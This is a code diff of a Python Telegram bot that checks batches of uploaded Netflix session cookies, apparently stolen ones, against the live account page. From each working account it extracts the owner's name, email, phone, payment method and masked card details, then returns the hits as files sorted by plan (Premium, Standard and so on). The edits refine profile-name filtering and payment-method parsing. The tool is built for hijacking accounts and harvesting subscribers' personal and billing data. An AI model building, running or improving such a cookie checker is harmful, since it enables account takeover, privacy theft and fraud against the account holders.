@@ -278,7 +278,6 @@ def normalize_phone_number(phone, country_code=None):
     if not cleaned:
         return phone
     
-    # إضافة كود الدولة
     if country_code in ["ID", "IN"]:
         if cleaned.startswith('0'):
             cleaned = '62' + cleaned[1:]
@@ -296,11 +295,10 @@ def normalize_phone_number(phone, country_code=None):
 
 
 def clean_profile_names(profiles_raw):
-    """تنقية أسماء البروفايلات وإزالة أسماء الأجهزة"""
+    """تنقية أسماء البروفايلات وإزالة أسماء الأجهزة والكلمات الغريبة"""
     if not profiles_raw:
         return [], 0
     
-    # قائمة الأسماء المرفوضة (أجهزة ومتصفحات)
     forbidden_names = [
         'android', 'tablet', 'apple', 'windows', 'mac', 'linux',
         'chrome', 'firefox', 'safari', 'edge', 'opera', 'brave',
@@ -308,23 +306,22 @@ def clean_profile_names(profiles_raw):
         'profile', 'user', 'default', 'unknown', 'device',
         'mobile', 'phone', 'computer', 'pc', 'laptop', 'desktop',
         'smartphone', 'ipod', 'watch', 'android tv', 'roku',
-        'apple tv', 'google tv', 'amazon', 'fire stick', 'chromecast'
+        'apple tv', 'google tv', 'amazon', 'fire stick', 'chromecast',
+        'api', 'akira', 'buildidentifier', 'identifier', 'null',
+        'undefined', 'none', 'nil', 'false', 'true', 'build'
     ]
     
-    # تقسيم الأسماء
     names_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
     
-    # تصفية الأسماء
     clean_names = []
     for name in names_list:
         name_lower = name.lower()
-        # تجاهل الأسماء المرفوضة
+        
         if name_lower in forbidden_names:
             continue
-        # تجاهل الأسماء القصيرة جداً (حرف أو حرفين)
         if len(name) < 3:
             continue
-        # تجاهل الأسماء اللي فيها كلمات مفتاحية
+        
         skip = False
         for forbidden in forbidden_names:
             if forbidden in name_lower:
@@ -332,40 +329,65 @@ def clean_profile_names(profiles_raw):
                 break
         if skip:
             continue
+        
+        if re.match(r'^\d+$', name):
+            continue
+        if re.search(r'[{}[]<>]', name):
+            continue
+            
         clean_names.append(name)
     
-    # لو مفيهوش أسماء نظيفة، حاول ترجع أي اسم
     if not clean_names:
         clean_names = [n for n in names_list if n.lower() not in forbidden_names]
     
     return clean_names, len(clean_names)
 
 
+def get_membership_status_display(status):
+    """تحويل حالة العضوية لنص مفهوم"""
+    status_map = {
+        "current_member": "Active",
+        "former_member": "Cancelled / Expired",
+        "active": "Active",
+        "current": "Active",
+        "past_due": "Past Due",
+        "cancelled": "Cancelled"
+    }
+    normalized = normalize_plan_key(status) if status else "unknown"
+    return status_map.get(normalized, status or "Unknown")
+
+
 def extract_payment_method_strong(html_content, info):
     """استخراج وسيلة الدفع من كل المصادر الممكنة"""
     
-    # المحاولة 1: من paymentMethodType في info
     payment = info.get("paymentMethodType")
     if payment and payment != "Unknown" and payment != "N/A" and payment != "null":
         if payment.upper() == "CC":
             return "Credit Card"
         if payment.upper() == "PAYPAL":
             return "PayPal"
-        if payment.upper() == "IDEAL":
+        if payment.upper() in ["IDEAL", "IDeal"]:
             return "iDEAL"
-        if payment.upper() == "GIFT":
+        if payment.upper() in ["GIFT", "GIFT CARD"]:
             return "Gift Card"
         return payment
     
-    # المحاولة 2: من HTML المباشر
+    billing_match = re.search(r'"billingInfo"\s*:\s*{[^}]*"paymentMethod"\s*:\s*"([^"]+)"', html_content)
+    if billing_match:
+        payment = decode_netflix_value(billing_match.group(1))
+        if payment:
+            if payment.upper() == "CC":
+                return "Credit Card"
+            return payment
+    
     patterns = [
         r'"paymentMethodType"\s*:\s*"([^"]+)"',
         r'"paymentOptionLogo"\s*:\s*"([^"]+)"',
         r'"paymentMethod"\s*:\s*"([^"]+)"',
         r'"paymentType"\s*:\s*"([^"]+)"',
-        r'"payment_method"\s*:\s*"([^"]+)"',
         r'"payer"\s*:\s*"([^"]+)"',
         r'"billingMethod"\s*:\s*"([^"]+)"',
+        r'"method"\s*:\s*"([^"]+)"',
     ]
     for pattern in patterns:
         match = re.search(pattern, html_content)
@@ -378,28 +400,17 @@ def extract_payment_method_strong(html_content, info):
                     return "PayPal"
                 return payment
     
-    # المحاولة 3: من maskedCard (لو في كارت يبقى أكيد في طريقة دفع)
     card = info.get("maskedCard")
     if card and card != "N/A" and card != "Unknown":
         return "Credit Card"
     
-    # المحاولة 4: من paymentMethodExists
-    payment_exists = info.get("paymentMethodExists")
-    if payment_exists and str(payment_exists).lower() in ["true", "yes", "1"]:
-        return "Payment Method Registered"
-    
-    # المحاولة 5: البحث عن كلمات في الـ HTML
     html_lower = html_content.lower()
-    if "credit card" in html_lower or "visa" in html_lower or "mastercard" in html_lower or "american express" in html_lower:
+    if "credit card" in html_lower or "visa" in html_lower or "mastercard" in html_lower:
         return "Credit Card"
     if "paypal" in html_lower:
         return "PayPal"
     if "ideal" in html_lower:
         return "iDEAL"
-    if "gift card" in html_lower or "gift certificate" in html_lower:
-        return "Gift Card"
-    if "direct debit" in html_lower:
-        return "Direct Debit"
     
     return "Unknown"
 
@@ -586,7 +597,6 @@ def extract_graphql_data(html_content):
     """استخراج GraphQL payload من HTML"""
     results = {}
     
-    # البحث عن GraphQL data في script tags
     script_pattern = r'<script[^>]*>window\.__NUXT__\s*=\s*({.*?})</script>'
     match = re.search(script_pattern, html_content, re.DOTALL)
     
@@ -606,7 +616,6 @@ def extract_graphql_data(html_content):
         except:
             pass
     
-    # البحث عن نموذج JSON مباشر
     json_pattern = r'{"data":\s*{[^}]*"growthAccount"[^}]*}}'
     json_match = re.search(json_pattern, html_content)
     if json_match:
@@ -623,7 +632,6 @@ def extract_account_info(growth_account):
     """استخراج بيانات الحساب من growthAccount"""
     info = {}
     
-    # معلومات الحساب الأساسية
     info['accountOwnerName'] = decode_netflix_value(growth_account.get('ownerName'))
     if not info['accountOwnerName']:
         info['accountOwnerName'] = decode_netflix_value(growth_account.get('accountOwnerName'))
@@ -635,32 +643,27 @@ def extract_account_info(growth_account):
     info['userGuid'] = decode_netflix_value(growth_account.get('ownerGuid'))
     info['isUserOnHold'] = growth_account.get('isUserOnHold', False)
     
-    # الـ Plan الحالي
     current_plan = growth_account.get('currentPlan', {}).get('plan', {})
     info['localizedPlanName'] = decode_netflix_value(current_plan.get('name'))
     info['planPrice'] = decode_netflix_value(current_plan.get('priceDisplay'))
     info['videoQuality'] = decode_netflix_value(current_plan.get('videoQuality'))
     info['maxStreams'] = current_plan.get('maxStreams')
     
-    # تاريخ التجديد
     next_billing = growth_account.get('nextBillingDate', {})
     info['nextBillingDate'] = decode_netflix_value(next_billing.get('localDate') or next_billing.get('date'))
     
-    # وسيلة الدفع
     payment_methods = growth_account.get('growthPaymentMethods', [])
     if payment_methods:
         pm = payment_methods[0]
         info['paymentMethodType'] = decode_netflix_value(pm.get('paymentOptionLogo'))
         info['maskedCard'] = decode_netflix_value(pm.get('displayText'))
     
-    # رقم الهاتف
     phone = growth_account.get('growthLocalizablePhoneNumber', {})
     phone_raw = decode_netflix_value(phone.get('rawPhoneNumber'))
     phone_country = decode_netflix_value(phone.get('countryCode'))
     info['phoneNumber'] = normalize_phone_number(phone_raw, phone_country)
     info['phoneVerified'] = phone.get('isVerified', False)
     
-    # البريد الإلكتروني تم التحقق منه
     email_obj = growth_account.get('growthEmail', {})
     if email_obj:
         email_value = decode_netflix_value(email_obj.get('email', {}).get('value'))
@@ -668,7 +671,6 @@ def extract_account_info(growth_account):
             info['email'] = email_value
         info['emailVerified'] = email_obj.get('isVerified', False)
     
-    # البروفايلات
     profiles = growth_account.get('profiles', [])
     profile_names = []
     for p in profiles:
@@ -681,7 +683,6 @@ def extract_account_info(growth_account):
     info['profiles'] = ", ".join(profile_names) if profile_names else None
     info['profileCount'] = len(profile_names)
     
-    # Extra member section
     info['showExtraMemberSection'] = "Yes" if growth_account.get('showExtraMemberSection') else "No"
     
     return {k: v for k, v in info.items() if v}
@@ -708,7 +709,6 @@ def extract_profile_names(response_text):
                 name = decode_netflix_value(match.group(1))
                 if name and name not in names and len(name) < 50:
                     names.append(name)
-    # تصفية أسماء المتصفحات
     filtered_names = [n for n in names if n.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera', 'windows', 'mac', 'linux']]
     return ", ".join(filtered_names[:10]) if filtered_names else (", ".join(names[:10]) if names else None)
 
@@ -743,20 +743,16 @@ def extract_info_fallback(response_text):
     return {k: v for k, v in extracted.items() if v}
 
 def extract_info(response_text):
-    # تجميع البيانات من كل المصادر
     all_info = {}
     
-    # 1. GraphQL data
     graphql_info = extract_graphql_data(response_text)
     if graphql_info and has_any_account_info(graphql_info):
         all_info.update(graphql_info)
     
-    # 2. Fallback HTML data
     fallback_info = extract_info_fallback(response_text)
     if fallback_info:
         all_info.update(fallback_info)
     
-    # تنظيف وتنسيق البيانات
     if all_info.get('email'):
         all_info['email'] = clean_text(all_info['email'])
     
@@ -776,16 +772,6 @@ def normalize_plan_key(plan_name):
 def get_canonical_output_label(plan_key):
     labels = {"premium": "Premium", "standard": "Standard", "basic": "Basic", "mobile": "Mobile", "free": "Free"}
     return labels.get(plan_key, "Unknown")
-
-def get_plan_folder_name(plan_key):
-    folder_names = {
-        "premium": "Premium",
-        "standard": "Standard",
-        "basic": "Basic",
-        "mobile": "Mobile",
-        "free": "Free"
-    }
-    return folder_names.get(plan_key, "Other")
 
 def derive_plan_info(info, is_subscribed):
     raw_plan = decode_netflix_value(info.get("localizedPlanName"))
@@ -816,7 +802,7 @@ def derive_plan_info(info, is_subscribed):
 
 def is_subscribed_account(info):
     status = normalize_plan_key(info.get("membershipStatus"))
-    return status in ["current_member", "active", "current"] or "member" in status
+    return status in ["current_member", "active", "current"]
 
 def is_extra_member_account(info):
     plan = str(info.get("localizedPlanName", "")).lower()
@@ -930,7 +916,7 @@ def get_account_page(session, proxy=None, timeout=15):
     return resp.text, resp.status_code, extract_info(resp.text)
 
 
-# ==================== RESULT FORMATTING (WITHOUT EMOJIS IN RESULTS) ====================
+# ==================== RESULT FORMATTING ====================
 
 def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename, nftoken_data=None, config=None):
     if config is None:
@@ -939,7 +925,6 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     plan_key, plan_label = derive_plan_info(info, is_subscribed)
     status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
     
-    # جلب الاسم من البروفايلات إذا كان Unknown
     account_name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
     if account_name == "Unknown" or account_name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
         account_name = get_name_from_profiles(info)
@@ -955,7 +940,6 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     member_since = format_member_since(info.get("memberSince")) or "Unknown"
     next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
     
-    # وسيلة الدفع - استخراج محسن
     payment = extract_payment_method_strong(cookie_filename if hasattr(cookie_filename, 'find') else "", info)
     if payment == "Unknown":
         payment = info.get("paymentMethodType") or "Unknown"
@@ -974,14 +958,27 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     hold = "No" if format_boolean_label(info.get("isUserOnHold")) != "Yes" else "Yes"
     extra_member = "Yes" if is_extra_member_account(info) else "No"
     email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) == "Yes" else "No"
-    membership_status = decode_netflix_value(info.get("membershipStatus")) or "Unknown"
     
-    # Get profiles - استخدام دالة التنقية
+    membership_raw = info.get("membershipStatus") or "Unknown"
+    membership_status = get_membership_status_display(membership_raw)
+    
     profiles_raw = info.get("profiles") or ""
     clean_profiles, clean_profiles_count = clean_profile_names(profiles_raw)
     
-    profiles_display = ", ".join(clean_profiles[:15]) if clean_profiles else "None"
-    profiles_count = clean_profiles_count if clean_profiles_count > 0 else (info.get("profileCount") or 0)
+    final_clean_profiles = []
+    for name in clean_profiles:
+        if 'api' in name.lower() or 'identifier' in name.lower() or 'build' in name.lower():
+            continue
+        if len(name) > 2 and name[0].isupper():
+            final_clean_profiles.append(name)
+        elif len(name) > 3:
+            final_clean_profiles.append(name)
+    
+    if not final_clean_profiles:
+        final_clean_profiles = clean_profiles
+    
+    profiles_display = ", ".join(final_clean_profiles[:15]) if final_clean_profiles else "None"
+    profiles_count = len(final_clean_profiles) if final_clean_profiles else (info.get("profileCount") or 0)
     
     lines = []
     lines.append("=" * 65)
@@ -1253,7 +1250,6 @@ async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
     total_bundles = len(bundles)
     await update.message.reply_text(f"📦 Found {total_bundles} cookie(s) in this file. Starting check...")
     
-    # Store results by plan
     results_by_plan = {
         "premium": [],
         "standard": [],
@@ -1341,7 +1337,6 @@ Speed: {spd:.2f} accounts/second
         await status_msg.delete()
         await update.message.reply_text(final)
         
-        # Send each plan file
         for plan, results in results_by_plan.items():
             if results and plan != "partial":
                 all_results = "".join(results)
@@ -1351,7 +1346,6 @@ Speed: {spd:.2f} accounts/second
                 filename = f"{plan.upper()}_ACCOUNTS.txt"
                 await update.message.reply_document(document=buf, filename=filename, caption=f"📄 {len(results)} {plan.upper()} Accounts Found")
         
-        # Send partial data file
         if results_by_plan["partial"]:
             all_partial = "".join(results_by_plan["partial"])
             buf = BytesIO()
@@ -1382,7 +1376,6 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     zip_data = BytesIO()
     await file.download_to_memory(zip_data)
     
-    # Store results by plan
     results_by_plan = {
         "premium": [],
         "standard": [],
@@ -1557,7 +1550,6 @@ Speed: {spd:.2f} files/second
             await msg.delete()
             await update.message.reply_text(final)
             
-            # Send each plan file
             for plan, results in results_by_plan.items():
                 if results and plan != "partial":
                     all_results = "".join(results)
@@ -1567,7 +1559,6 @@ Speed: {spd:.2f} files/second
                     filename = f"{plan.upper()}_ACCOUNTS.txt"
                     await update.message.reply_document(document=buf, filename=filename, caption=f"📄 {len(results)} {plan.upper()} Accounts Found")
             
-            # Send partial data file
             if results_by_plan["partial"]:
                 all_partial = "".join(results_by_plan["partial"])
                 buf = BytesIO()
